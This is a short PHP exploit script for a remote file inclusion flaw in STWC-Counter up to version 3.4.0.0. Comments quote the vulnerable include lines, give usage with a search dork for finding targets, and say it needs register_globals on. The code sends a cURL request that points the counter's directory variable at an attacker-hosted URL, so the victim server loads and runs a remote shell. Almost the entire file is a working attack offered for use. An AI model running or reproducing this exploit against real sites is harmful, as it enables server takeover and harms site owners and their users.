<?php

//File Inclusion Exploit for Version STWC-Counter <= 3.4.0.0
//Found and Exploit Coded by burncycle - burncycle[(at)]hotmail[(dot)]de
//|
//Vendor: http://www.stwc-counter.de/
//Dork: www.stwc-counter.de
//|
//Bug in "downloadcounter.php":
//..
//$stwc_verzeichniss = $stwc_counter_verzeichniss;
//..
//include($stwc_verzeichniss . "funktionen_intern.php");
//include($stwc_verzeichniss . "einstellungen.php");
//include($stwc_verzeichniss . "funktionen_ausgabe.php");
//..
//include($stwc_verzeichniss . "sprache/deutsch.php");
//..
//include($stwc_verzeichniss . "sprache/english.php");
//..
//|
//Usage: php exploit.php [pathtoscript] [pathtoshell]
//Example: php exploit.php http://pathtoscript.com/counter/ http://pathtoshell.com/(funktionen_intern.php)(einstellungen.php)(funktionen_ausgabe.php)(sprache/deutsch.php)(sprache/english.php)
//|
//Needs the cURL extension of PHP
//Works only with register_globals = on

//Nur ausnahme Fehler anzeigen
error_reporting(1);

echo "Usage: php ".$_SERVER["argv"][0]." [pathtoscript] [pathtoshell]\r\n\r\n";
echo "Example: php ".$_SERVER["argv"][0]." http://pathtoscript.com/counter/ http://pathtoshell.com/(funktionen_intern.php)(einstellungen.php)(funktionen_ausgabe.php)(sprache/deutsch.php)(sprache/english.php)\r\n\r\n";

//Schauen ob alles angegeben wurde
if(!empty($_SERVER["argv"][1]) && !empty($_SERVER["argv"][2]))
{

  $pathtoscript = $_SERVER["argv"][1];
  $pathtoshell = $_SERVER["argv"][2];

  //erzeuge ein neues cURL Handle
  $ch = curl_init();

  //setzte die URL und andere Optionen
  curl_setopt($ch, CURLOPT_URL, $pathtoscript."downloadcounter.php?stwc_counter_verzeichniss=".$pathtoshell);
  curl_setopt($ch, CURLOPT_HEADER, 0);

  //f.hre die Aktion aus
  curl_exec($ch);

  //schlie.e das Handle und gebe Systemresourcen frei
  curl_close($ch);

}

?>
